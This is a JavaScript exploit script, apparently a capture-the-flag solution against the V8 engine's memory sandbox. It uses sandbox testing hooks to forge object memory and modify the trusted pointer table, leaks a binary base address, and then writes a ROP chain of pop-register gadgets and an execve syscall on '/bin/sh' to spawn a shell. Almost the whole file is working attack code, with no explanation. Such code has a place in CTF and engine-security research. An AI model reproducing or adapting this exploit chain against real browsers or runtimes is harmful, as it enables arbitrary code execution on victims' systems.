const shellcode = (a, b) => {
  return a ^ b;
};
shellcode();
// % DebugPrint(shellcode);

class Helpers {
  constructor() {
    this.buf = new ArrayBuffer(8);
    this.dv = new DataView(this.buf);
    this.u8 = new Uint8Array(this.buf);
    this.u32 = new Uint32Array(this.buf);
    this.u64 = new BigUint64Array(this.buf);
    this.f32 = new Float32Array(this.buf);
    this.f64 = new Float64Array(this.buf);

    this.roots = new Array(0x30000);
    this.index = 0;
  }

  pair_i32_to_f64(p1, p2) {
    this.u32[0] = p1;
    this.u32[1] = p2;
    return this.f64[0];
  }

  i64tof64(i) {
    this.u64[0] = i;
    return this.f64[0];
  }

  f64toi64(f) {
    this.f64[0] = f;
    return this.u64[0];
  }

  set_i64(i) {
    this.u64[0] = i;
  }

  set_l(i) {
    this.u32[0] = i;
  }

  set_h(i) {
    this.u32[1] = i;
  }

  get_i64() {
    return this.u64[0];
  }

  ftoil(f) {
    this.f64[0] = f;
    return this.u32[0];
  }

  ftoih(f) {
    this.f64[0] = f;
    return this.u32[1];
  }

  add_ref(object) {
    this.roots[this.index++] = object;
  }

  hex_to_dbl(hexString) {
    if (hexString.startsWith("0x")) {
      hexString = hexString.substring(2);
    }

    for (let i = 0; i < 8; i++) {
      const byte = hexString.substring(
        hexString.length - (i + 1) * 2,
        hexString.length - i * 2,
      );
      this.u8[i] = parseInt(byte, 16);
    }

    const float64 = new Float64Array(this.u8.buffer);
    return float64[0];
  }

  mark_sweep_gc() {
    new ArrayBuffer(0x7fe00000);
  }

  scavenge_gc() {
    for (var i = 0; i < 8; i++) {
      // fill up new space external backing store bytes
      this.add_ref(new ArrayBuffer(0x200000));
    }
    this.add_ref(new ArrayBuffer(8));
  }

  hex(i) {
    return i.toString(16).padStart(16, "0");
  }

  breakpoint() {
    this.buf.slice();
  }
}

var helper = new Helpers();

// =================== //
//     Start here!     //
// =================== //

var sbxMemView = new Sandbox.MemoryView(0, 0xfffffff8);
var addrOf = (o) => Sandbox.getAddressOf(o);

var dv = new DataView(sbxMemView);

var readHeap4 = (offset) => dv.getUint32(offset, true);
var readHeap8 = (offset) => dv.getBigUint64(offset, true);

var writeHeap1 = (offset, value) => dv.setUint8(offset, value, true);
var writeHeap4 = (offset, value) => dv.setUint32(offset, value, true);
var writeHeap8 = (offset, value) => dv.setBigUint64(offset, value, true);

let mem = [
  helper.hex_to_dbl("0x0040020000000949"),
  helper.hex_to_dbl("0x001950090000000c"),
  helper.hex_to_dbl("0x0000001100000000"),
  helper.hex_to_dbl("0x0000000000000019"),
  helper.hex_to_dbl("0x0000000000000002"),
  helper.hex_to_dbl("0x000000afafaf210b"),
];
// helper.hex_to_dbl("0x000000af0018030b")];
// % DebugPrint(mem);

// r12=[x-0x20] r9=[x=0x28]>>1 [r12+r9]==0xb5 or 0xaf
// rbx=[x-0x20] ebx=[rbx+0x1f] valid

let base = Sandbox.H32BinaryAddress;
console.log(base.toString(16));
// Sandbox.modifyTrustedPointerTable(Number(0xffffffffffffn), readHeap4(addrOf(mem) + 8) + 7, Number(0x1b000000000000n) + Sandbox.base);
Sandbox.modifyTrustedPointerTable(
  0x400200,
  readHeap4(addrOf(mem) + 8) + 8,
  Number(0x1b000000000000n) + Sandbox.base,
);

let l = shellcode() << 1;

let leak;
if (l < 0) leak = base + l - 0x252b31c + 0x100000000;
else leak = base + l - 0x252b31c;
console.log(leak.toString(16));
// % SystemBreak();
mem[5] = helper.hex_to_dbl("0x000000af0018030b");

let shell = [1.1, 2.2];
let shell_addr = addrOf(shell);

writeHeap8(shell_addr - 0x1f, BigInt(shell_addr + Sandbox.base));
writeHeap4(shell_addr - 0x27, 0);
writeHeap8(shell_addr, 0xb5n);
writeHeap4(shell_addr + 0x1f, 4);

writeHeap8(shell_addr + 9, BigInt(leak + 0x000000000135f98e)); // pop rdi; ret;
let binsh = 0x0068732f6e69622fn;
let zero = 0n;

let binsh_addr = Sandbox.base + addrOf(binsh) + 8;
let zero_addr = Sandbox.base + addrOf(zero) + 0x10;
console.log(binsh_addr.toString(16));
console.log(zero_addr.toString(16));
let start = shell_addr + 0x31;
writeHeap8(start, BigInt(binsh_addr));
writeHeap8(start + 8, BigInt(leak + 0x0000000001249f8e)); // pop rsi; ret;
writeHeap8(start + 8 * 2, BigInt(zero_addr));
writeHeap8(start + 8 * 3, BigInt(leak + 0x000000000120cd42)); // pop rdx; ret;
writeHeap8(start + 8 * 4, BigInt(zero_addr));
writeHeap8(start + 8 * 5, BigInt(leak + 0x00000000011a8972)); // pop rax; ret;
writeHeap8(start + 8 * 6, BigInt(0x3b));
writeHeap8(start + 8 * 7, BigInt(leak + 0x00000000011a9815)); // syscall

shellcode(shell);
